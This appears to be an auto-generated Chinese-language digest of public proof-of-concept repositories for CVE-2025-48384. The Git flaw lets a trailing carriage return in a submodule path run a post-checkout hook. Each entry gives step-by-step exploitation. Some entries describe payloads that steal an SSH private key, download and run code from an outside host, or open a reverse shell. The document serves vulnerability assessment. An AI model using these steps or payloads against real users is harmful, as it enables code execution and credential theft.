**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，允许攻击者通过构造特殊的 Git 配置文件，在受害者克隆或初始化子模块时执行任意代码。漏洞的根源在于 Git 对配置项中尾部回车符（CR）处理不当。当 Git 读取配置值时，会删除尾部的 CRLF，但写入时，如果值以 CR 结尾，则不会进行引号处理，导致 CR 在后续读取时丢失。如果子模块路径包含尾部 CR，这会导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的 POC 代码 `/tmp/4ddcea7dd1399c323a9fb7a8b3071e04/README.md` 本身并不能直接验证漏洞，它只是一个简单的说明文件。真正的 POC 应该包含能够触发漏洞的恶意 Git 仓库配置和子模块结构。从搜索结果来看，存在可用的 POC。

**投毒风险：**

提供的 README.md 文件本身不包含任何可执行代码，因此直接的投毒风险较低。但是，如果该仓库中存在其他文件（例如恶意的 `.gitmodules` 文件或者钩子脚本），则存在投毒的风险。假设仓库作者在其他文件中隐藏了恶意代码的可能性存在，估计投毒风险为 10%。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含特殊构造的 `.gitmodules` 文件和恶意的子模块钩子脚本的 Git 仓库。
2.  **.gitmodules 构造：**  `.gitmodules` 文件中的子模块路径包含尾部回车符（CR），例如 `path = submodule_path\r`。
3.  **符号链接：** 创建一个符号链接，将 `submodule_path` 指向 `.git/modules/<submodule_name>/hooks`。
4.  **恶意钩子：** 子模块中包含一个 `post-checkout` 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户：** 攻击者诱骗受害者克隆该恶意仓库并初始化子模块（使用 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`）。
6.  **触发漏洞：** 当 Git 初始化子模块时，由于路径中的回车符被错误处理，子模块会被检出到错误的位置。由于存在符号链接，`post-checkout` 钩子会被执行，从而导致任意代码执行。

**项目地址:** [eliox01/CVE-2025-48384](https://github.com/eliox01/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384-Git配置注入与任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库或者提交包含恶意配置的patch

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，没有正确处理回车符 \r，导致在特定情况下（如初始化包含子模块的仓库时），子模块路径被错误解析。攻击者可以利用这一点，通过在子模块路径中注入恶意字符，配合精心构造的符号链接，将子模块检出到非预期位置，例如 Git 钩子目录。如果子模块包含恶意的 post-checkout 钩子脚本，则在检出后会被执行，从而实现任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，此漏洞的利用需要满足一定条件，即需要用户 clone 包含恶意子模块配置的仓库或者提交包含恶意配置的patch。提供的 POC 代码 `/tmp/8746716955bead91920f029f2728e38d/README.md` 仅仅是一个 README 文件，本身不具备任何攻击性，因此不能直接作为有效的 POC。

**投毒风险评估：**
提供的 POC 代码只是一个简单的 README 文件，没有任何可执行代码，因此不存在直接的投毒风险。投毒行为可能存在于更复杂的攻击场景中，比如在精心构造的恶意 Git 仓库中，但仅凭这个 README 文件无法评估其风险。

**利用方式：**
1.  攻击者创建一个包含恶意子模块配置的 Git 仓库，子模块的路径包含回车符 \r。
2.  攻击者创建一个符号链接，将修改后的子模块路径指向 Git 钩子目录（.git/hooks）。
3.  攻击者在子模块中包含一个恶意的 post-checkout 钩子脚本。
4.  受害者 clone 该恶意仓库，Git 初始化子模块时，由于回车符处理不当，子模块被检出到错误的钩子目录。
5.  检出完成后，恶意的 post-checkout 钩子脚本被执行，攻击者从而实现任意代码执行。

**项目地址:** [elprogramadorgt/CVE-2025-48384](https://github.com/elprogramadorgt/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户执行恶意Git操作（例如，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，允许通过畸形的配置引用执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符时存在缺陷。具体来说，当Git写入配置条目时，如果值包含尾部的回车符（CR），则不会被正确引用。当后续读取配置时，尾部的CR会被删除，导致配置路径发生变化。

**利用方式：**

1.  攻击者创建一个包含恶意的`.gitmodules`文件的仓库。在这个文件中，子模块的路径包含一个尾部的回车符。
2.  攻击者设置一个符号链接，将经过修改的（尾部回车符被删除）子模块路径指向`.git/hooks`目录。
3.  攻击者在子模块中放置一个可执行的`post-checkout`钩子。
4.  受害者克隆该仓库并初始化子模块。
5.  当子模块初始化时，由于路径的更改以及符号链接的存在，`post-checkout`钩子会被执行，从而导致任意代码执行。

**POC有效性：**

提供的POC代码是一个`post-checkout`钩子脚本，它会尝试通过`curl`命令从`https://jarvis.webhop.me/pwned`下载并执行内容。这个脚本本身就是漏洞利用的一部分，当上述步骤成功执行时，该脚本将被执行，从而实现远程代码执行。

**投毒风险：**

提供的POC代码本身旨在利用该漏洞，因此不应将其视为潜在的投毒代码。然而，攻击者可以利用此漏洞传播恶意软件或执行其他恶意活动。此处的0%表示该代码片段本身没有隐藏其他恶意逻辑，它仅仅是利用该漏洞实现代码执行的载体。


**项目地址:** [mukesh-610/cve-2025-48384-exploit](https://github.com/mukesh-610/cve-2025-48384-exploit)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

